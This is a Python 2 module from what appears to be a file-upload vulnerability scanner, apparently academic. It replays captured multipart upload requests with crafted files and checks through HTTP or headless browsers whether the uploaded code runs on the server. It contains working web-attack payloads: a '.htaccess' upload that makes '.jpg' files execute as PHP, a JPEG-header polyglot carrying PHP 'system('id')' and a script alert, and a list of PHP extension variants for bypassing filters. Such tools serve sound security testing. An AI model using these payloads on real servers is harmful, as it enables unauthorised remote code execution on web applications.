import itertools
import mimetools
import mimetypes
import urllib2
import zlib
import gzip
import StringIO as StrIO
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
from selenium.common.exceptions import TimeoutException
import hashlib
import datetime
import os

from urllib import unquote

Debug = False
HEADLESS_VERIFY = False
# HEADLESS_VERIFY=True

# add Headers in request
def addHeader(req, referer=None, contenttype=None):
    req.add_header(
        'User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36')
    req.add_header(
        'Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8')
    if referer != None:
        req.add_header('Referer', referer)
    if contenttype != None:
        req.add_header('Content-Type', contenttype)

def ungzip(data, encode=None):
    if encode != None:
        if "deflate" in encode.lower():
            ret = zlib.decompress(data, 16+zlib.MAX_WBITS)
        elif "gzip" in encode.lower():
            tmp = StrIO.StringIO(data)
            ret = gzip.GzipFile(fileobj=tmp).read()
    else:
        ret = data
    return ret

class headlessTester(object):
    __testable__ = ['chrome', 'firefox']

    def browserTest(self, url, req_txt_header=None, getBrowser=False):
        ret = {}

        # req_txt_header = req_txt[0]
        header_lines = req_txt_header.splitlines()
        for header_line in header_lines[1:]:
            header_line_sep = header_line.split(':')
            if header_line_sep[0].strip() == 'Cookie':
                cookie = header_line_sep[1].strip()

        # Firefox
        browser = self.getFirefoxDriver() 
        # if code not executed, test is none
        test = self.headlesstest(url, browser, cookie) 
        browser.close()
        if test != None:  # code executed
            if not getBrowser:
                return [True, test]
            else:
                ret["firefox"] = [True, test]
        else:
            ret["firefox"] = [False, test]
        
        # Chrome
        browser = self.getChromeDriver()
        test = self.headlesstest(url, browser, cookie)
        browser.close()
        if test != None:  
            if not getBrowser:
                return [True, test] 
            else:
                ret["chrome"] = [True, test]
        else:
            ret["chrome"] = [False, test]

        res_code = None 
        if getBrowser:  
            return ret
        else: 
            try: 
                req = urllib2.Request(url)
                if Debug:
                    print "[http request] full verification urlopen"
                res = urllib2.urlopen(req)
            except urllib2.HTTPError as e:
                res_code = e.code
                res = None

            if res_code == None and res != None:
                res_code = res.code
            if res_code == 403:
                return [False, "Forbidden"]

            if res_code == 500:
                return [True, None]
            elif res_code == 200 and res != None:
                return [False, res.read()]
            else:
                return [False, None]

    def getFirefoxDriver(self):
        profile = webdriver.FirefoxProfile()
        profile.set_preference("browser.download.folderList", 2)
        profile.set_preference(
            "browser.download.manager.showWhenStarting", False)
        profile.set_preference("browser.download.dir",
                               os.path.abspath('./tmp'))
        profile.set_preference("browser.helperApps.neverAsk.saveToDisk",
                               "image/jpeg;image/gif;image/png;application/pdf;application/zip;application/gzip;text/plain")
        profile.set_preference("browser.helperApps.alwaysAsk.force", False)

        options = webdriver.FirefoxOptions()
        options.set_headless(True) 

        browser = webdriver.Firefox(firefox_profile=profile, options=options)
        return browser

    def getChromeDriver(self):
        options = webdriver.ChromeOptions()
        options.add_argument('headless')
        prefs = {"download.default_directory": os.path.abspath('./tmp')}
        options.add_experimental_option("prefs", prefs)
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument(
            "download.default_directory={}".format(os.path.abspath('./tmp')))
        browser = webdriver.Chrome(chrome_options=options)
        return browser

    def headlesstest(self, url, browser, cookie=None):
        browser.set_page_load_timeout(1)  # Load limit = 1sec
        try:
            browser.get(url)
        except:
            pass

        alert = None
        ret_data = None
        try:
            WebDriverWait(browser, 0.1).until(
                expected_conditions.alert_is_present()
            )
            alert = browser.switch_to.alert
        except TimeoutException:
            pass
        if alert != None:
            ret_data = alert.text
            alert.accept()

        return ret_data

class MultiPartForm(object):
    """Accumulate the data to be used when posting a form."""
    """Provided by Ahnmo @ KAIST WSPLAB"""

    def __init__(self, boundary=mimetools.choose_boundary()):
        self.form_fields = []
        self.files = []
        # self.boundary = mimetools.choose_boundary()
        self.boundary = boundary
        return

    def get_content_type(self):
        return 'multipart/form-data; boundary=%s' % self.boundary

    def add_field(self, name, value):
        """Add a simple field to the form data."""
        self.form_fields.append((name, value))
        return

    def add_file(self, fieldname, filename, fileHandle, mimetype=None): 
        """Add a file to be uploaded."""
        body = fileHandle
        if mimetype is None:
            mimetype = mimetypes.guess_type(
                filename)[0] or 'application/octet-stream'
        self.files.append((fieldname, filename, mimetype, body))
        return

    def __str__(self):
        """Return a string representing the form data, including attached files."""
        # Build a list of lists, each containing "lines" of the
        # request.  Each part is separated by a boundary string.
        # Once the list is built, return a string where each
        # line is separated by '\r\n'.
        parts = []
        part_boundary = '--' + self.boundary

        # Add the form fields
        parts.extend(
            [part_boundary,
             'Content-Disposition: form-data; name="%s"' % name,
             '',
             value,
             ]
            for name, value in self.form_fields
        )

        # Add the files to upload
        parts.extend(
            [part_boundary,
             'Content-Disposition: file; name="%s"; filename="%s"' %
             (field_name, filename),
             'Content-Type: %s' % content_type,
             '',
             body,
             ]
            for field_name, filename, content_type, body in self.files
        )

        # Flatten the list and add closing boundary marker,
        # then return CR+LF separated data
        flattened = list(itertools.chain(*parts))
        flattened.append('--' + self.boundary + '--')
        flattened.append('')
        return '\r\n'.join(flattened)

def makeRemoveRequest(file_id, req_txt, boundary, target):
    req = {}
    form = MultiPartForm(boundary)

    # process body
    for body_each_cont in req_txt[1]:
        if 'name' in body_each_cont:
            field_lines = body_each_cont.splitlines()
            field_name = field_lines[0].split(';')[1].split('=')[1].strip()[1:-1]
            # print '[' +field_name+ ']'
            # field_cont = body_each_cont.split('\n\n')[1]
            if field_name == "attachmentaid":
                field_cont = str(file_id)
            else:
                field_cont = ""
                for cont_line in field_lines[1:]:
                    if cont_line != "":
                        field_cont = cont_line.strip()
                        break

            # print '[' +field_cont+ ']'
            # print '\n'
            form.add_field(field_name, field_cont)
    
    req['body'] = str(form)

    req['type'] = form.get_content_type()

    header_lines = req_txt[0].splitlines()
    url = target["removeURL"]

    print "req['body']: ", req['body']
    tempLen = len(req['body'])
    tempBody = req['body']
    print "tempLen: ", tempLen

    try:
        # httpproxy_handler = urllib2.ProxyHandler({"http" : "192.168.2.96:8081"})
        # opener = urllib2.build_opener(httpproxy_handler)
        req = urllib2.Request(url.encode('ascii'))
        for header_line in header_lines[1:]:
            header_line_sep = header_line.split(':')
            if header_line_sep[0].strip() == 'Content-Length':
                req.add_header(header_line_sep[0].strip(), tempLen)
                # req.add_header(header_line_sep[0].strip(), len(req['body']))
            elif header_line_sep[0].strip() == 'Content-Type':
                tempCon = header_line_sep[1].strip().split("boundary=",1)[0]
                tempCon = tempCon + "boundary=" + boundary
                req.add_header(header_line_sep[0].strip(), tempCon)
            else:
                req.add_header(header_line_sep[0].strip(), header_line_sep[1].strip())

        req.add_data(tempBody)

        if Debug:
            print "[http request] uploadFile urlopen"

        # res_obj = opener.open(req)
        res_obj = urllib2.urlopen(req)
    except urllib2.HTTPError as e:
        res_obj = e

    if res_obj.code >= 300 and res_obj.code < 400:
        redirect_url = res_obj.headers['Location']
        #print 'redirect_url : ' + redirect_url
        #exit()
        while True:
            rereq = urllib2.Request(redirect_url)
            for header_line in header_lines[1:]:
                header_line_sep = header_line.splite(':')
                if header_line_sep[0].strip() == 'Content-Length':
                    req.add_header(header_line_sep[0].strip(), len(tempBody))
                elif header_line_sep[0].strip() == 'Referer':
                    req.add_header(header_line_sep[0].strip(), url)
                else:
                    req.add_header(header_line_sep[0].strip(), header_line_sep[1].strip())
            try:
                if Debug:
                    print "[http request] upload File - 302 re-urlopen"
                res_obj = urllib2.urlopen(rereq)
            except urllib2.HTTPError as e:
                res_obj = e
            if not (res_obj.code >= 300 and res_obj.code < 400):
                break
    if "content-encoding" in res_obj.headers.keys():
        encode = res_obj.headers['content-encoding']
    else:
        encode = None
    # print res_obj.read()
    # print "[+] res_obj.code..."
    # print res_obj.code
    res = ungzip(res_obj.read(), encode)
    # print "[+] upload_res ..."
    # print res
    # print "[+] ..."

    if res != None:
        return (True, res)
    else:
        return (False, res)


def makeUploadRequest(req_txt_body, boundary, uploadFile):# uploadFile
    req = {}
    form = MultiPartForm(boundary)

    # process body
    for body_each_cont in req_txt_body:
        if 'filename' in body_each_cont:
            # field_name = body_each_cont.split('\n\n')[0].split(';')[1].split('=')[1].strip()[1:-1]
            field_name = body_each_cont.split(';')[1].split('=')[1].strip()[1:-1]
            # print '[' +field_name+ ']'
            # print '\n'

            # insert mutate_data
            if uploadFile["fileext"] != None and len(uploadFile["fileext"]) > 0:
                form.add_file(field_name, uploadFile["filename"]+"."+uploadFile["fileext"],
                              fileHandle=uploadFile["content"], mimetype=uploadFile["filetype"])
            else:
                form.add_file(field_name, uploadFile["filename"],
                              fileHandle=uploadFile["content"], mimetype=uploadFile["filetype"])

        elif 'name' in body_each_cont:
            field_lines = body_each_cont.splitlines()
            field_name = field_lines[0].split(';')[1].split('=')[1].strip()[1:-1]
            # print '[' +field_name+ ']'
            # field_cont = body_each_cont.split('\n\n')[1]
            field_cont = ""
            for cont_line in field_lines[1:]:
                if cont_line != "":
                    field_cont = cont_line.strip()
                    break

            # print '[' +field_cont+ ']'
            # print '\n'
            form.add_field(field_name, field_cont)
    
    req['body'] = str(form)
    req['type'] = form.get_content_type()
    req['filename'] = uploadFile['filename']
    # print req
    return req


def uploadFile(upload_req, req_txt_header, target):
    # process header
    # req_txt_header = req_txt[0]
    # print req_txt_header
    header_lines = req_txt_header.splitlines()
    url = target["webUploadURL"]
    # print "[+] uploadFile ..."
    # print url
    # print req_txt_header
    # print upload_req
    # print "[+] ..."
    # exit()

    try:
        # httpproxy_handler = urllib2.ProxyHandler({"http" : "192.168.2.96:8081"})
        # opener = urllib2.build_opener(httpproxy_handler)
        req = urllib2.Request(url.encode('ascii'))
        for header_line in header_lines[1:]:
            header_line_sep = header_line.split(':',1)
            if header_line_sep[0].strip() == 'Content-Length':
                req.add_header(header_line_sep[0].strip(), len(upload_req['body']))
            else:
                req.add_header(header_line_sep[0].strip(), header_line_sep[1].strip())

        req.add_data(upload_req['body'])

        if Debug:
            print "[http request] uploadFile urlopen"

        # res_obj = opener.open(req)
        res_obj = urllib2.urlopen(req)
    except urllib2.HTTPError as e:
        res_obj = e

    if res_obj.code >= 300 and res_obj.code < 400:
        redirect_url = res_obj.headers['Location']
        #print 'redirect_url : ' + redirect_url
        #exit()
        while True:
            rereq = urllib2.Request(redirect_url)
            for header_line in header_lines[1:]:
                header_line_sep = header_line.splite(':')
                if header_line_sep[0].strip() == 'Content-Length':
                    req.add_header(header_line_sep[0].strip(), len(upload_req['body']))
                elif header_line_sep[0].strip() == 'Referer':
                    req.add_header(header_line_sep[0].strip(), url)
                else:
                    req.add_header(header_line_sep[0].strip(), header_line_sep[1].strip())
            try:
                if Debug:
                    print "[http request] upload File - 302 re-urlopen"
                res_obj = urllib2.urlopen(rereq)
            except urllib2.HTTPError as e:
                res_obj = e
            if not (res_obj.code >= 300 and res_obj.code < 400):
                break
    if "content-encoding" in res_obj.headers.keys():
        encode = res_obj.headers['content-encoding']
    else:
        encode = None
    # print res_obj.read()
    # print "[+] res_obj.code..."
    # print res_obj.code
    res = ungzip(res_obj.read(), encode)
    # print "[+] upload_res ..."
    # print res
    # print "[+] ..."

    if res != None:
        return (True, res)
    else:
        return (False, res)


def print_Li(L):
    length = len(L)
    i=0
    while i<length:
        print L[i]
        i +=1


def accessValidation(target, url, content, resultString, seedType, opList, seedFilename, req_txt_header):
    #print seedFilename
    fileextension = url.split('.')[-1].lower()
    phpParsingList = ['php3', 'php4', 'php5', 'php7', 'pht', 'phtml', 'phar', 'phps']
    if not HEADLESS_VERIFY:
        try:
            req = urllib2.Request(url.encode('ascii'))
            # req_txt_header = req_txt[0]
            header_lines = req_txt_header.splitlines()
            for header_line in header_lines[1:]:
                header_line_sep = header_line.split(':')
                if header_line_sep[0].strip() == 'Cookie':
                    req.add_header('Cookie', header_line_sep[1].strip())
                elif header_line_sep[0].strip() == 'Host':
                    req.add_header('Host', header_line_sep[1].strip())
                    req.add_header('Origin', header_line_sep[1].strip())
                elif header_line_sep[0].strip() == 'User-Agent':
                    req.add_header('User-Agent', header_line_sep[1].strip())
            req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8')
            if Debug:
                print "[http request] light-verification urlopen"
            res = urllib2.urlopen(req)
        except urllib2.HTTPError as e:
            res = e
        resCode = res.code
        resData = res.read()
        #print resData
        isSniffBan = False
        #print resultString
        #print 'content: ' + content
        #print 'resData: ' + resData
        if resultString in resData:
            return [True, "Execution Succeed"]
        elif content in resData:
            if res != None and 'content-type' in res.headers.keys():
                cnt_type = res.headers['content-type']
                cnt_type = cnt_type.split(';', 1)[0]
            else:
                cnt_type = None
            ######################################### Compatible PHP version ######################################
            if((fileextension in phpParsingList)):
                return [True, "Execution Succeed"]
            ####################################################################################################
            if "x-content-type-options" in res.headers.keys() and res.headers['x-content-type-options'] == "nosniff":
                print "[-] Content Sniffing Banned!"
                isSniffBan = True
            ######################################################## 4 Seed ######################################################
            if (seedType == 'html' or seedType == 'xhtml') and (cnt_type == None and not isSniffBan) or (cnt_type != None and ("text/html" in cnt_type or "application/xhtml+xml" in cnt_type)):
                # php, js - Potencial Code Execution, html - Code Execution
                return [True, "Code Exposed"]
            #########################################################   ########################################################
            elif (seedType == 'html' or seedType == 'xhtml') and (cnt_type != None and ("image/svg+xml" in cnt_type or "message/rfc822" in cnt_type)):
                return [True, "Code Exposed"]
            elif (seedType == 'js') and ((not isSniffBan and (cnt_type == None or ("application/pdf" in cnt_type) or ("application/x-gzip" in cnt_type) or ("application/xhtml+xml" in cnt_type) or ("application/zip" in cnt_type) or ("text/html" in cnt_type) or ("text/plain" in cnt_type) or ("application/javascript" in cnt_type))) or (isSniffBan and cnt_type != None and "application/javascript" in cnt_type)):  # cnt_type condition will be appended
                return [True, "Code Exposed"]
            elif (seedType == 'php'):
                return [True, "Code Exposed"]
            elif ("_SEED" in seedFilename) and (seedType in opList) and ((cnt_type == None) or  ("text/html" in cnt_type) or ("text/plain" in cnt_type) or ("image/jpeg" in cnt_type) or  ("application/zip" in cnt_type) or ("image/png" in cnt_type) or ("image/gif" in cnt_type) or ("application/pdf" in cnt_type) or ("application/x-gzip" in cnt_type) or ("image/x-ms-bmp" in cnt_type)):
                return [True, "File Type Restriction Detection"]
            else:
                return [False, "Code Exposed"]
        elif resCode == 500:
            return [True, "Execution Succeed"]  # code execution
        elif ("_SEED" in seedFilename) and resCode == 403:
            return [True, "File Type Restriction Detection"]
        elif resCode == 403:
            return [False, "Forbidden"]
        else:
            return [False, "Fail"]
    else:
        tester = headlessTester()
        res = tester.browserTest(url, req_txt_header)
        def uni2asc(x): return chr(ord(x))
        if res[1] != None:
            res[1] = ''.join(map(uni2asc, res[1]))

        if res[0]:
            if res[1] != None and res[1] == resultString:
                ret = [True, "Execution Succeed"]
            elif res[1] != None and resultString in res[1]:
                ret = [True, "Execution Succeed"]
            else:
                ret = [True, "Execution Succeed but something wrong"]
        elif res[1] == "Forbidden":
            ret = [False, "Forbidden"]
        elif content == res[1]:
            ret = [True, "Code Exposed"]
        else:
            ret = [False, "Fail"]
        return ret


def makeS1Data(m3_mut=""):
    # S1 - .htaccess try
    conttype = m3_mut
    if m3_mut == "":
        conttype = "text/plain"
    output = {
        'filename': ".htaccess",
        'fileext': "",
        'filetype': conttype,
        'content': "AddType application/x-httpd-php .jpg"
    }
    return output


def makeS1TestData():
    # S1 - test data
    output = {
        'filename': hashlib.md5(datetime.datetime.now().__str__()).hexdigest(),
        'fileext': "jpg",
        'filetype': "image/jpg",
        'content': """\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46<?php system('id');$sign=pack('H*',dechex((2534024256545858215*2)));print "<script>alert('".$sign."');</script>";?><!--{}-->""".format(os.urandom(8).encode('hex'))
    }
    return output


def processRequest(req_txt, req_url):
    request_lines = req_txt.strip().splitlines()
    # print_Li(request_lines)

    # get boundary, upload_url, and webHost
    cnt = ''
    boundary = ''
    temp_host = ''
    temp_upload = ''
    for req_each_line in request_lines[1:]:
        if ("Content-Type:" in req_each_line or "content-type:" in req_each_line) and 'boundary' in req_each_line:
            cnt = req_each_line
            # print cnt
        elif "Host:" in req_each_line or "host:" in req_each_line:
            temp_host = req_each_line.split(':',1)[1].strip()

    # consider http or https accroding url
    req_protocal = ''
    if req_url[:7] == "http://":
        req_protocal = 'http://'
    elif req_url[:8] == "https://":
        req_protocal = 'https://'

    if temp_host[:7] != "http://" and temp_host[:8] != "https://":
        host_url = req_protocal + temp_host
    temp_upload = request_lines[0].split()[1]
    if temp_upload[:7] != "http://" and temp_upload[:8] != "https://":
        upload_url = host_url + temp_upload

    if cnt != '':
       boundary = cnt.split(';')[1].split('=')[1].strip()
    # print boundary
    
    req_txt_semi = req_txt.rsplit('--'+boundary, 1)[0].split('--'+boundary)
    # print req_txt_semi[0].strip()
    req_txt_header = req_txt_semi[0].strip()
    req_txt_body_li = []
    # print req_txt_header
    for each_semi in req_txt_semi[1:]:
        each_semi_q = unquote(each_semi.strip())
        req_txt_body_li.append(each_semi_q)
        # print each_semi
    
    return [req_txt_header, req_txt_body_li], boundary, host_url, upload_url